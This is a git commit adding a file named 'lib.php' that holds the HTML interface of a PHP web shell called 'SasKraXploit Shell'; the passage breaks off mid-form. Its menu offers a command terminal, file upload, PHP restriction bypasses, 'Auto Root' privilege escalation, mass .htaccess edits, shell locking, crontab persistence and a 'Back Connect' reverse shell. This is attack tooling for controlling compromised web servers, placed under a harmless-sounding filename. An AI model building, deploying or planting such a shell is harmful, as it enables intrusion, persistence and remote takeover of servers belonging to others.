effb6d9b4c5e54e3f1f508d90585af405dd31570
raitokazuki <97198960+RaitoKazuki@users.noreply.github.com>
2025-01-17 11:27:34 +0700

    Add files via upload

---
+++ lib.php
@@ -0,0 +1,87 @@
+		<!doctype html>
+		<html lang="en">
+		<head>
+			<meta charset="utf-8">
+			<meta name="viewport" content="width=device-width, initial-scale=1">
+			<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+			<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+			<title>SasKraXploit Shell</title>
+		</head>
+		<body>
+			<div class="container-lg">
+				
+				<nav class="navbar navbar-light bg-light">
+					<div class="container-fluid">
+						<a class="navbar-brand" href="?">
+							<img src="https://f.top4top.io/p_29216zc2j1.jpg" alt="logo" width="30" height="24" class="d-inline-block align-text-top">
+							SasKraXploit Shell						</a>
+					</div>
+				</nav>
+				
+				
+				<div id="tool">
+					<div class="d-flex justify-content-center flex-wrap my-3">
+						<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassgc2" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7-8</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#bypassgc1" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Bypass PHP 7.0 - 7.3</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#autoroot" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Auto Root</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#massht" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Mass .htaccess</a><br>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#c" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Terminal</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#lockshell" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Lock Shell</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#lockfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Lock File</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#crontab" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Crontab</a>
+						<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#IIIIIIlIIIll" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> Back Connect</a>
+					</div>
+					
+
+					<div class="col-md-12">
+						<div class="collapse" id="lockshell" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<input type="submit" name="lockshell" value="Mulai">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="IIIIIIlIIIll" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<input type="submit" name="IIIIIIlIIIll" value="Mulai">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="lockfile" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<label for="command">Masukkan perintah:</label>
+									<input type="text" name="cmd" required>
+									<input type="submit" name="lockfile" value="Submit">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="crontab" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<input type="submit" name="crontab" value="Mulai">
+								</form>
+							</div>
+						</div>
+					</div>
+
+					<div class="col-md-12">
+						<div class="collapse" id="bypassgc1" data-bs-parent="#tool">
+							<div class="card card-body border-dark mb-3">
+								<form method="POST">
+									<label for="command">Masukkan perintah:</label>
+									<input type="text" name="cmd" requ
